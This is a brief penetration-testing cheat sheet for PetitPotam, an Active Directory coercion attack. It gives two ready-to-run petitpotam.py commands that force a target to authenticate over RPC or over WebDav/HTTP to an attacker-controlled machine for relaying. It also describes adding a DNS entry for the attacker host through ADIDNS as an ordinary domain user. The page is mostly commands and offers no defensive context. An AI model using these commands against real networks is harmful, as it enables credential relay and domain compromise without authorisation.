# PetitPotam

% petitpotam, coerce, webdav

## Coerce
#assessment/AD #attack_type/Coerce_Relay #port/111 #protocol/rpc #access/Domain_user
https://github.com/topotam/PetitPotam

Exploit PetitPotam to coerce an authentication towards the attacker machine.

⚠️ Requirement : NETBIOS name for the attacker machine. If the domain has ADIDNS configured by default, a DNS entry pointing to the attacker machine can be created with dnstool.py as a standard domain user.

```bash
petitpotam.py -d <domain> -u <user> -p <password> '<attacker_netbios_name>@<port>\randomfile.txt' <ip>
```

## WebDav coerce (HTTP)
#assessment/AD #attack_type/Coerce_Relay #port/111 #protocol/rpc #access/Domain_user
https://github.com/topotam/PetitPotam

Exploit PetitPotam to coerce a HTTP authentication through an exposed WebDav service towards the attacker machine.

⚠️ Requirement : NETBIOS name for the attacker machine. If the domain has ADIDNS configured by default, a DNS entry pointing to the attacker machine can be created with dnstool.py as a standard domain user.

```bash
petitpotam.py -d <domain> -u <user> -p <password> '<attacker_netbios_name>@80\randomfile.txt' <ip>
```

= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
